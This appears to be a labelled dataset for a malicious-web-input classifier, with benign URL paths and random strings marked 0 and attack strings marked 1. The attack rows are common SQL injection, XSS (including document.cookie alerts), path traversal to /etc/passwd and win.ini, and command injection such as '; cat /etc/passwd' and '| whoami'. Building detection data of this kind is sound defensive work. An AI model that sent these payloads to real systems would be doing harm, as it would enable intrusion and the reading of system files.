/index?session=48907,0
' OR '1'='1,1
1' o r '1'='1,1
/register?id=6318,0
/cart?session=59685,0
dashboard,0
/home?session=97237,0
/search?id=5089,0
/user?session=22244,0
/index?id=2812,0
/checkout?id=9043,0
/about?session=55152,0
onerror=alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
; cat /etc/passwd,1
login,0
/register?session=95496,0
cart,0
' OR 1=1 --,1
blog,0
/register?session=46113,0
cart,0
/profile?id=4228,0
/about?id=8924,0
search,0
/profile?session=33861,0
' OR 2=5 --,1
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
TXDvHPnZiKWc3G,0
user,0
YEEB6KaxGI1cXYe,0
../../../windows/win.ini,1
' OR 2=5 --,1
/user?session=84628,0
search,0
javascript:alert(1),1
/about?id=7829,0
dashboard,0
C8IoxUmJFD1Sa,0
jt2W2GFDuUia,0
/search?id=5315,0
FIc4QT6Ym23P,0
/dashboard?id=5168,0
/about?id=5245,0
<script>var a=54;alert(a)</script>,1
/blog?session=96241,0
<script>var a=947;alert(a)</script>,1
/settings?id=2766,0
blog,0
4Y6beC3HhZ,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=772;alert(a)</script>,1
/login?session=89368,0
/register?id=1522,0
register,0
/checkout?id=3400,0
<script>var a=781;alert(a)</script>,1
/home?session=75108,0
' OR 4=6 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
home,0
<script>var a=766;alert(a)</script>,1
C3dNAQIqeLuF4tg,0
bKeHKohhb0QcV,0
' OR 1=2 --,1
cart,0
SwMsv9zs7kqnvz,0
settings,0
/index?id=6185,0
../../../windows/win.ini,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin' --,1
/login?id=5105,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 9=9 --,1
Wb5oi8vsX,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
cart,0
' OR '1'='1,1
<script>var a=989;alert(a)</script>,1
<script>var a=653;alert(a)</script>,1
../../../../etc/passwd,1
../../../../etc/passwd,1
admin' --,1
' OR 6=5 --,1
/cart?session=45819,0
../../../../etc/passwd,1
/profile?session=82375,0
/register?id=9067,0
<script>alert(document.cookie)</script>,1
1' o r '1'='1,1
| whoami,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/checkout?id=1085,0
/home?session=83799,0
1' o r '1'='1,1
<script>var a=863;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>alert(document.cookie)</script>,1
/index?session=93123,0
settings,0
/contact?session=89203,0
<script>alert(document.cookie)</script>,1
| whoami,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
s6LG3qZyzdk,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
index,0
' OR 1=9 --,1
<script>var a=756;alert(a)</script>,1
x5nTOjaAVCFA4,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?session=92785,0
s E l E c T * f R o M a d m i n,1
register,0
admin' --,1
/contact?id=8299,0
/contact?id=9012,0
' OR 1=1 --,1
<script>alert(document.cookie)</script>,1
/login?id=6824,0
/checkout?session=11528,0
Jt8UQ2IAp9JF,0
' OR '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../../etc/passwd,1
/register?session=54692,0
javascript:alert(1),1
/search?id=9356,0
../../../windows/win.ini,1
/user?id=1313,0
../../../../etc/passwd,1
orB6t37kg3w,0
/contact?id=5905,0
s E l E c T * f R o M a d m i n,1
' OR 1=1 --,1
<script>var a=41;alert(a)</script>,1
checkout,0
<script>var a=931;alert(a)</script>,1
<script>var a=38;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 5=5 --,1
' OR 1=7 --,1
search,0
checkout,0
' OR 4=3 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=892;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
XWKexYBC8TswBp1,0
/dashboard?id=5380,0
../../../../etc/passwd,1
cart,0
/user?id=8464,0
onerror=alert(1),1
9fW0hgE7tFS,0
| whoami,1
login,0
' OR '1'='1,1
admin' --,1
' OR 3=9 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR '1'='1,1
home,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/dashboard?id=7467,0
/login?session=10369,0
/blog?id=8578,0
/settings?session=86895,0
dashboard,0
' OR 5=3 --,1
kJeHXYdaeARL,0
../../../windows/win.ini,1
/profile?session=96399,0
vCSEbnJqrLfmX,0
KXBxzh0eLm,0
dashboard,0
/blog?id=2362,0
<script>var a=148;alert(a)</script>,1
' OR '1'='1,1
dashboard,0
<script>alert(document.cookie)</script>,1
3X9ZaHjlku1,0
eyoPcEbf73MM4,0
/contact?session=30655,0
/index?id=224,0
/cart?session=33359,0
<script>var a=195;alert(a)</script>,1
/blog?session=37830,0
/cart?id=7142,0
' OR 1=7 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
about,0
' OR 1=7 --,1
about,0
user,0
/settings?session=54765,0
search,0
/dashboard?session=60301,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/contact?session=69628,0
<script>alert(document.cookie)</script>,1
/profile?id=2569,0
<script>var a=922;alert(a)</script>,1
<script>var a=406;alert(a)</script>,1
P1wYUER1,0
' OR 1=1 --,1
' OR 4=6 --,1
Ms1jVYsl1qhd,0
' OR 4=1 --,1
' OR 8=7 --,1
<script>alert(document.cookie)</script>,1
<script>var a=47;alert(a)</script>,1
<script>var a=177;alert(a)</script>,1
contact,0
checkout,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/home?id=2843,0
nbIqUmNl6xdAZZU,0
' OR 2=8 --,1
/checkout?id=2473,0
<script>alert(document.cookie)</script>,1
cart,0
' OR 5=7 --,1
' OR 1=1 --,1
<script>var a=935;alert(a)</script>,1
/settings?session=37350,0
../../../windows/win.ini,1
<script>var a=901;alert(a)</script>,1
/dashboard?id=9443,0
<script>var a=308;alert(a)</script>,1
blog,0
/cart?session=29485,0
admin'/* bypass */OR 1=1,1
<script>var a=618;alert(a)</script>,1
' OR 9=4 --,1
settings,0
F1L2mx4id5,0
; cat /etc/passwd,1
5MbvIeNesQG0fYY,0
<script>var a=211;alert(a)</script>,1
/search?session=64710,0
/settings?session=20262,0
/checkout?session=64709,0
<script>var a=932;alert(a)</script>,1
blog,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
1' o r '1'='1,1
sXmGnQO29zZcLv,0
/contact?session=33486,0
dashboard,0
' OR 1=1 --,1
/blog?session=84303,0
settings,0
aty2UAQ9,0
<script>var a=361;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
javascript:alert(1),1
KJ57gXpmwT,0
/contact?id=2431,0
' OR 3=2 --,1
/checkout?id=674,0
/settings?session=40080,0
user,0
; cat /etc/passwd,1
CsMfYQQv,0
settings,0
/search?session=87785,0
/contact?session=50575,0
<script>var a=675;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/index?id=2042,0
/about?id=914,0
1' o r '1'='1,1
<script>var a=857;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
AyffkblvuaR,0
' OR 8=5 --,1
<script>var a=21;alert(a)</script>,1
JZuYhF5NCY,0
<script>var a=172;alert(a)</script>,1
' OR 5=3 --,1
' OR 1=1 --,1
/register?session=32407,0
/about?session=85475,0
blog,0
' OR 3=2 --,1
b7iYhybGaOaTm,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
SnUU4S4K3KG5v3j,0
onerror=alert(1),1
TBJQgiSc2tV,0
' OR 1=1 --,1
' OR '1'='1,1
<script>var a=142;alert(a)</script>,1
' OR 1=8 --,1
admin' --,1
69id4kdYBc7,0
' OR 8=1 --,1
/login?id=1667,0
/cart?id=9884,0
../../../windows/win.ini,1
/search?id=6273,0
admin'/* bypass */OR 1=1,1
s E l E c T * f R o M a d m i n,1
zJH3V5rYr5WJItm,0
| whoami,1
onerror=alert(1),1
' OR '1'='1,1
3W8rwXtXhElV,0
FXmTYSASbx8,0
dashboard,0
login,0
' OR 6=4 --,1
cg7Gm1ib6u4vIXo,0
| whoami,1
/home?session=96020,0
onerror=alert(1),1
admin%00' OR 1=1,1
<script>var a=640;alert(a)</script>,1
contact,0
contact,0
<script>var a=847;alert(a)</script>,1
/dashboard?session=66712,0
register,0
register,0
' OR 1=1 --,1
onerror=alert(1),1
| whoami,1
/checkout?session=10475,0
/login?id=8661,0
admin' --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/login?id=7986,0
javascript:alert(1),1
1' o r '1'='1,1
1' o r '1'='1,1
admin'/* bypass */OR 1=1,1
unou1Y5evhOCs,0
oyV82a5sKtLWT,0
' OR 2=5 --,1
about,0
/checkout?session=39803,0
' OR 3=9 --,1
KKsm25yN,0
/contact?id=6337,0
<script>var a=628;alert(a)</script>,1
y31voSaFKX36x,0
<script>var a=636;alert(a)</script>,1
' OR 1=1 --,1
/search?id=5140,0
fLADHABK5Q,0
/settings?session=55297,0
; cat /etc/passwd,1
<script>var a=347;alert(a)</script>,1
/settings?session=73137,0
admin' --,1
; cat /etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/index?id=3536,0
/profile?id=3382,0
/register?session=95488,0
/login?id=8525,0
/about?session=39212,0
s E l E c T * f R o M a d m i n,1
user,0
; cat /etc/passwd,1
/home?session=83145,0
<script>var a=602;alert(a)</script>,1
/home?session=26980,0
profile,0
../../../../etc/passwd,1
wHRVF0vd7rODu,0
/blog?session=70569,0
admin%00' OR 1=1,1
../../../windows/win.ini,1
s E l E c T * f R o M a d m i n,1
blog,0
../../../../etc/passwd,1
register,0
/register?id=8459,0
profile,0
settings,0
blog,0
' OR 9=2 --,1
blog,0
' OR 4=8 --,1
checkout,0
/user?id=1012,0
/profile?id=5480,0
/about?session=23189,0
dashboard,0
../../../../etc/passwd,1
IlXPtVIpYSCA,0
admin%00' OR 1=1,1
' OR 1=3 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin' --,1
/contact?session=26886,0
/settings?id=2072,0
bG6KOZRd3yFqJWG,0
admin'/* bypass */OR 1=1,1
admin' --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../windows/win.ini,1
admin%00' OR 1=1,1
| whoami,1
dashboard,0
/settings?id=5863,0
/contact?session=57396,0
/user?session=46536,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=575;alert(a)</script>,1
blog,0
1' o r '1'='1,1
' OR 2=3 --,1
/register?session=39294,0
admin%00' OR 1=1,1
Ub03ic72,0
' OR '1'='1,1
/user?id=436,0
' OR 5=7 --,1
/checkout?session=35689,0
| whoami,1
/blog?id=9321,0
/index?session=43971,0
| whoami,1
/user?id=1244,0
; cat /etc/passwd,1
' OR 8=5 --,1
KkOKGc611DTG,0
bgWV1xHyNy,0
' OR 1=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/index?session=96031,0
| whoami,1
admin%00' OR 1=1,1
FQX4LLTiiKthK64,0
h7RektK1l4QYaat,0
/dashboard?session=97648,0
javascript:alert(1),1
' OR 9=7 --,1
/user?session=71120,0
onerror=alert(1),1
../../../windows/win.ini,1
/settings?id=3342,0
/search?session=80116,0
/login?id=863,0
' OR '1'='1,1
' OR 1=5 --,1
../../../windows/win.ini,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/search?id=6504,0
/dashboard?id=8208,0
/dashboard?session=34575,0
/blog?session=28084,0
user,0
/index?session=74798,0
javascript:alert(1),1
s E l E c T * f R o M a d m i n,1
| whoami,1
qWuLoLL5Ipnu,0
/checkout?session=67007,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/user?session=68270,0
<script>var a=812;alert(a)</script>,1
<script>var a=945;alert(a)</script>,1
' OR '1'='1,1
/register?id=237,0
onerror=alert(1),1
; cat /etc/passwd,1
cart,0
' OR 5=9 --,1
/home?session=47607,0
/index?session=60488,0
index,0
javascript:alert(1),1
home,0
<script>var a=438;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
2qhZBzu7,0
index,0
' OR 6=5 --,1
; cat /etc/passwd,1
/register?session=38540,0
XrgTqq31yUXQ,0
/checkout?id=8058,0
4Hheg1Ld7,0
' OR 9=7 --,1
' OR 5=5 --,1
/index?session=89036,0
1' o r '1'='1,1
blog,0
' OR 4=7 --,1
blog,0
sNINeMvVIrvckv,0
admin'/* bypass */OR 1=1,1
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
user,0
<script>alert(document.cookie)</script>,1
/index?id=3620,0
<script>var a=705;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
LqHl3A2d9W,0
/blog?session=36508,0
/profile?id=1468,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/home?id=4352,0
<script>alert(document.cookie)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
profile,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/blog?id=7015,0
uaI88cNEb07,0
<script>var a=498;alert(a)</script>,1
/dashboard?id=6928,0
index,0
/profile?id=6211,0
/contact?session=18276,0
<script>var a=926;alert(a)</script>,1
' OR 2=7 --,1
' OR 8=2 --,1
<script>var a=639;alert(a)</script>,1
admin%00' OR 1=1,1
' OR 4=9 --,1
V4yGhrmvwSH,0
' OR 1=1 --,1
<script>var a=564;alert(a)</script>,1
y8l9NuLwIjLX2qN,0
' OR 9=3 --,1
../../../windows/win.ini,1
../../../../etc/passwd,1
<script>var a=409;alert(a)</script>,1
/register?session=66421,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
/cart?session=65315,0
../../../../etc/passwd,1
/login?id=7876,0
admin'/* bypass */OR 1=1,1
kz9bdpfFOOzs,0
; cat /etc/passwd,1
aRjH14CX63,0
1' o r '1'='1,1
Rlwg8HuRXp,0
/search?session=38601,0
' OR 9=6 --,1
checkout,0
/login?id=5710,0
search,0
8eBQ3RY8REqtJN,0
' OR 6=2 --,1
/home?session=61982,0
/blog?id=4260,0
/dashboard?session=42776,0
/cart?session=36753,0
blog,0
/about?id=8886,0
' OR 1=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
profile,0
admin%00' OR 1=1,1
| whoami,1
<script>var a=421;alert(a)</script>,1
' OR 8=4 --,1
s E l E c T * f R o M a d m i n,1
register,0
uSOLzANz,0
login,0
search,0
79Qu7GGw6,0
/login?session=63889,0
/blog?session=49000,0
' OR 4=3 --,1
<script>var a=374;alert(a)</script>,1
| whoami,1
' OR '1'='1,1
seNXC14qJl,0
contact,0
contact,0
admin%00' OR 1=1,1
<script>var a=574;alert(a)</script>,1
/checkout?session=20145,0
' OR '1'='1,1
/cart?session=40401,0
cart,0
/user?id=7013,0
' OR 7=5 --,1
../../../../etc/passwd,1
| whoami,1
/about?session=83968,0
/about?session=77243,0
VWo0VLh13j6EbCD,0
' OR 1=1 --,1
/register?id=8444,0
<script>var a=407;alert(a)</script>,1
1' o r '1'='1,1
user,0
javascript:alert(1),1
bGXoX1Ze9Huu4,0
<script>var a=68;alert(a)</script>,1
/register?id=6198,0
/blog?id=3745,0
dashboard,0
s E l E c T * f R o M a d m i n,1
/cart?id=3472,0
/profile?session=77270,0
' OR '1'='1,1
<script>var a=646;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/profile?id=4535,0
/register?id=1607,0
/checkout?id=6694,0
' OR 1=1 --,1
onerror=alert(1),1
/checkout?id=890,0
| whoami,1
/search?session=75525,0
/blog?session=14984,0
' OR 1=1 --,1
' OR 2=8 --,1
' OR 4=7 --,1
login,0
checkout,0
9VP8VEAORbgC,0
/contact?session=51211,0
<script>var a=763;alert(a)</script>,1
LmdrkSS3L,0
CF62Dvpd4oik8X,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
P9MDx16QNFG,0
checkout,0
dashboard,0
cart,0
settings,0
/login?session=59355,0
/register?session=30358,0
javascript:alert(1),1
/user?id=5606,0
../../../../etc/passwd,1
admin' --,1
/login?session=23465,0
login,0
/home?id=3933,0
1' o r '1'='1,1
<script>var a=608;alert(a)</script>,1
/cart?session=60265,0
/profile?id=3783,0
dashboard,0
<script>var a=111;alert(a)</script>,1
' OR 1=2 --,1
onerror=alert(1),1
cart,0
/profile?id=5470,0
JenygOPWsLU,0
../../../../etc/passwd,1
javascript:alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/checkout?session=97376,0
/checkout?session=47682,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>alert(document.cookie)</script>,1
' OR 1=1 --,1
ovOae42DcBhQNh,0
' OR 2=1 --,1
admin'/* bypass */OR 1=1,1
' OR 8=5 --,1
user,0
' OR 9=3 --,1
kSinOrgY6LE96y,0
/about?id=9530,0
' OR 5=5 --,1
<script>var a=117;alert(a)</script>,1
0ZKStVxxOJ,0
txgvX40CktQwbS,0
/settings?session=48691,0
/settings?session=57263,0
/user?session=83474,0
/contact?id=9490,0
' OR 8=2 --,1
<script>var a=670;alert(a)</script>,1
<script>var a=296;alert(a)</script>,1
7awPbt6PN0,0
; cat /etc/passwd,1
' OR 1=5 --,1
/settings?id=8755,0
register,0
' OR 1=4 --,1
m5fFnDWZWs4t,0
iG0mZM1Jo,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=893;alert(a)</script>,1
/user?id=7234,0
wz9aWEsyq8ux,0
/blog?id=9866,0
/contact?id=396,0
<script>var a=271;alert(a)</script>,1
MFhEmoV9v5h,0
<script>var a=190;alert(a)</script>,1
javascript:alert(1),1
/login?session=70857,0
contact,0
| whoami,1
kMM7rJ5828t,0
| whoami,1
bhiWzBl34W,0
<script>var a=923;alert(a)</script>,1
/settings?session=99895,0
cart,0
contact,0
/about?id=3484,0
rxCJQ91JEYJtRZ,0
/dashboard?session=24108,0
javascript:alert(1),1
tWBJnoNYxD,0
/settings?session=59677,0
; cat /etc/passwd,1
| whoami,1
settings,0
8TqRwYPiGa,0
javascript:alert(1),1
ro1w7imXZZSOAT,0
; cat /etc/passwd,1
/index?id=5613,0
about,0
/blog?id=5983,0
<script>var a=800;alert(a)</script>,1
/search?session=29941,0
EzO4o3NX,0
profile,0
cart,0
javascript:alert(1),1
javascript:alert(1),1
/home?id=8944,0
checkout,0
/dashboard?session=83294,0
7si9EprvTCn8ssW,0
' OR 1=1 --,1
1' o r '1'='1,1
j69JreVRx8Y7h4,0
jMMd61BSY17wX,0
' OR 9=5 --,1
QdIVOaRY7rnn4V,0
<script>var a=96;alert(a)</script>,1
' OR 1=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/dashboard?session=47775,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
| whoami,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
s E l E c T * f R o M a d m i n,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
K3K2neYqOL,0
<script>var a=37;alert(a)</script>,1
/dashboard?session=25714,0
s E l E c T * f R o M a d m i n,1
' OR 4=4 --,1
../../../windows/win.ini,1
' OR 9=5 --,1
/user?session=63360,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
u6NWNbDdR,0
; cat /etc/passwd,1
/login?session=56223,0
dashboard,0
<script>var a=298;alert(a)</script>,1
<script>var a=590;alert(a)</script>,1
profile,0
' OR 3=1 --,1
' OR '1'='1,1
admin%00' OR 1=1,1
<script>alert(document.cookie)</script>,1
search,0
<script>var a=826;alert(a)</script>,1
/about?session=86476,0
blog,0
megRJUzkt0H,0
blog,0
1JLiLzv14o8,0
' OR 8=7 --,1
zNslQjOmO5cIb,0
s E l E c T * f R o M a d m i n,1
ynO0ByFEb43uW,0
' OR 6=4 --,1
' OR 3=3 --,1
about,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/blog?id=2648,0
/search?id=6508,0
B2t2WDu20WiMLtm,0
' OR 9=5 --,1
<script>var a=495;alert(a)</script>,1
OtQR6iuBqgQWPa,0
/dashboard?session=60644,0
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
lrHLNMXL,0
' OR 7=7 --,1
admin'/* bypass */OR 1=1,1
1' o r '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../../etc/passwd,1
' OR 4=3 --,1
/contact?session=54200,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
1' o r '1'='1,1
3oWsSYJd37VkKF,0
/about?id=1097,0
' OR 5=9 --,1
register,0
/register?id=5791,0
<script>var a=817;alert(a)</script>,1
profile,0
/checkout?id=7690,0
checkout,0
../../../../etc/passwd,1
MsSER3p1XH8S,0
/blog?session=96331,0
admin'/* bypass */OR 1=1,1
; cat /etc/passwd,1
onerror=alert(1),1
<script>var a=243;alert(a)</script>,1
/search?id=9253,0
klluSxnBDNwwSUp,0
; cat /etc/passwd,1
D78ZOgLGj,0
' OR '1'='1,1
upYhLkwsrWC,0
YT222GLe,0
tdVoK9ctwmY6l,0
| whoami,1
' OR 8=8 --,1
bfjb2H4PUupTk1k,0
../../../windows/win.ini,1
<script>var a=853;alert(a)</script>,1
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 8=2 --,1
<script>var a=224;alert(a)</script>,1
../../../../etc/passwd,1
admin'/* bypass */OR 1=1,1
/checkout?id=9388,0
' OR '1'='1,1
' OR 1=1 --,1
/profile?id=6130,0
| whoami,1
bvAHMF7m,0
<script>var a=65;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=785;alert(a)</script>,1
/settings?id=2050,0
<script>alert(document.cookie)</script>,1
' OR 3=8 --,1
/profile?session=40704,0
/search?id=5516,0
../../../../etc/passwd,1
<script>var a=489;alert(a)</script>,1
/cart?session=24553,0
<script>var a=189;alert(a)</script>,1
' OR '1'='1,1
/blog?session=95748,0
about,0
/search?id=2564,0
iMSRed1fKB5r17A,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR '1'='1,1
/user?session=68009,0
yXIzliudoAq2K,0
../../../../etc/passwd,1
<script>var a=338;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/blog?session=10950,0
search,0
/dashboard?session=44549,0
<script>var a=357;alert(a)</script>,1
' OR 1=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=414;alert(a)</script>,1
/home?id=6677,0
../../../../etc/passwd,1
onerror=alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/blog?id=7320,0
onerror=alert(1),1
dashboard,0
bkgHsiOBuH,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/about?session=20747,0
MKmXZb9zWae0nSD,0
../../../../etc/passwd,1
javascript:alert(1),1
index,0
/blog?id=2251,0
/settings?id=6043,0
/blog?session=16095,0
xWBkzBpM,0
' OR 7=1 --,1
/about?session=37491,0
' OR 3=7 --,1
<script>var a=377;alert(a)</script>,1
user,0
admin'/* bypass */OR 1=1,1
../../../../etc/passwd,1
/register?id=8672,0
/index?id=706,0
admin'/* bypass */OR 1=1,1
' OR 3=1 --,1
' OR 4=1 --,1
WwhRjRvOIr90,0
LpOFhxTvFVvbrC,0
home,0
/index?id=9244,0
admin%00' OR 1=1,1
admin' --,1
' OR '1'='1,1
/profile?id=1951,0
' OR 4=1 --,1
/about?session=29274,0
1' o r '1'='1,1
; cat /etc/passwd,1
<script>var a=991;alert(a)</script>,1
' OR 1=1 --,1
contact,0
<script>var a=994;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
| whoami,1
/blog?session=77979,0
W98Oj7bKLf6Lm3Q,0
' OR 6=4 --,1
/search?session=39854,0
/dashboard?id=4447,0
<script>var a=380;alert(a)</script>,1
profile,0
../../../windows/win.ini,1
/cart?session=32736,0
<script>var a=583;alert(a)</script>,1
' OR 2=8 --,1
../../../windows/win.ini,1
<script>var a=100;alert(a)</script>,1
settings,0
/login?session=49300,0
../../../../etc/passwd,1
/dashboard?id=4134,0
<script>var a=743;alert(a)</script>,1
; cat /etc/passwd,1
DUJgA0FT,0
about,0
admin%00' OR 1=1,1
onerror=alert(1),1
U8DtQmSRR,0
<script>var a=833;alert(a)</script>,1
home,0
/about?session=73199,0
user,0
' OR 1=1 --,1
javascript:alert(1),1
/checkout?id=5489,0
/dashboard?id=5565,0
yRlY1aNlGuZ,0
<script>alert(document.cookie)</script>,1
s E l E c T * f R o M a d m i n,1
' OR 6=8 --,1
/checkout?id=7745,0
vUmMUIFL,0
/blog?session=66756,0
dashboard,0
index,0
javascript:alert(1),1
/login?session=34064,0
/login?session=23169,0
contact,0
wHzsyAkq,0
' OR 7=7 --,1
/home?session=54146,0
' OR 9=5 --,1
admin' --,1
../../../windows/win.ini,1
login,0
admin%00' OR 1=1,1
javascript:alert(1),1
<script>var a=142;alert(a)</script>,1
/profile?session=87532,0
<script>var a=216;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
6EfyKU7OiD,0
/register?session=12733,0
/home?id=4576,0
/settings?session=49788,0
<script>alert(document.cookie)</script>,1
' OR 1=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/blog?id=3440,0
' OR '1'='1,1
' OR 8=4 --,1
/home?session=22055,0
<script>var a=175;alert(a)</script>,1
/checkout?id=518,0
xZxcINsg1M,0
search,0
' OR 4=2 --,1
/dashboard?id=9175,0
1' o r '1'='1,1
| whoami,1
' OR 4=5 --,1
' OR 7=7 --,1
/about?id=8637,0
y5zwzQrg9,0
<script>var a=379;alert(a)</script>,1
BEFaBaP5dPv,0
/contact?session=41617,0
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
' OR '1'='1,1
' OR 1=1 --,1
/register?session=99236,0
<script>var a=942;alert(a)</script>,1
/cart?session=40174,0
<script>var a=992;alert(a)</script>,1
/about?id=5970,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
javascript:alert(1),1
knXSQnvHtE9,0
' OR 1=1 --,1
onerror=alert(1),1
../../../windows/win.ini,1
user,0
javascript:alert(1),1
<script>var a=802;alert(a)</script>,1
1' o r '1'='1,1
<script>var a=192;alert(a)</script>,1
cart,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR '1'='1,1
/user?session=21388,0
profile,0
<script>var a=348;alert(a)</script>,1
' OR 1=2 --,1
register,0
<script>var a=608;alert(a)</script>,1
../../../windows/win.ini,1
' OR 1=1 --,1
checkout,0
../../../../etc/passwd,1
cart,0
; cat /etc/passwd,1
checkout,0
<script>var a=644;alert(a)</script>,1
KRKzs7sZyvbIr4,0
' OR 2=9 --,1
s E l E c T * f R o M a d m i n,1
home,0
QJwTl4We,0
Bzn3M7COT6,0
<script>var a=233;alert(a)</script>,1
/login?id=9862,0
home,0
blog,0
admin' --,1
s E l E c T * f R o M a d m i n,1
admin%00' OR 1=1,1
CfkOYCQrFU,0
s E l E c T * f R o M a d m i n,1
OzJeAmT5vS54Lqi,0
/blog?id=6889,0
/search?id=1694,0
g5kkP36BGFr,0
dashboard,0
/about?session=18341,0
profile,0
' OR 7=3 --,1
' OR 5=1 --,1
/search?session=78073,0
' OR 1=1 --,1
HrwjGNGbhycQ4,0
' OR '1'='1,1
5OQMu7vUa52,0
onerror=alert(1),1
/index?id=2285,0
' OR 1=1 --,1
login,0
/register?id=1640,0
' OR 1=5 --,1
../../../windows/win.ini,1
/dashboard?session=40907,0
' OR 6=3 --,1
/cart?id=6234,0
admin'/* bypass */OR 1=1,1
' OR 7=4 --,1
<script>var a=936;alert(a)</script>,1
/cart?session=61733,0
' OR 3=6 --,1
| whoami,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=394;alert(a)</script>,1
/checkout?id=4353,0
<script>var a=76;alert(a)</script>,1
' OR 7=9 --,1
gucEE51U2hXO9L,0
' OR 4=5 --,1
/checkout?id=1724,0
1' o r '1'='1,1
/search?id=8125,0
/login?session=26009,0
' OR '1'='1,1
cSUjoTSWiVt,0
' OR '1'='1,1
onerror=alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 6=4 --,1
/blog?session=75383,0
<script>var a=362;alert(a)</script>,1
/blog?session=55692,0
<script>var a=1;alert(a)</script>,1
/search?id=1196,0
bvOjXZoAkBVJH4d,0
; cat /etc/passwd,1
contact,0
javascript:alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 1=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/register?session=61970,0
/blog?session=64607,0
7xQE6HQWqcS5gba,0
user,0
' OR 5=1 --,1
6lKPjbH0d,0
../../../windows/win.ini,1
/about?id=4139,0
/checkout?session=17342,0
/login?id=7835,0
' OR 9=6 --,1
1' o r '1'='1,1
V4P1D3kOtD1Q6,0
/contact?session=27089,0
; cat /etc/passwd,1
settings,0
/profile?id=5758,0
<script>alert(document.cookie)</script>,1
<script>var a=537;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
search,0
' OR 1=7 --,1
/search?id=9404,0
' OR 3=9 --,1
' OR 1=6 --,1
a02vZ924JPoBZM,0
<script>var a=755;alert(a)</script>,1
/settings?id=5271,0
<script>var a=710;alert(a)</script>,1
onerror=alert(1),1
/login?id=1264,0
s E l E c T * f R o M a d m i n,1
PllTVtancHgZV,0
; cat /etc/passwd,1
| whoami,1
; cat /etc/passwd,1
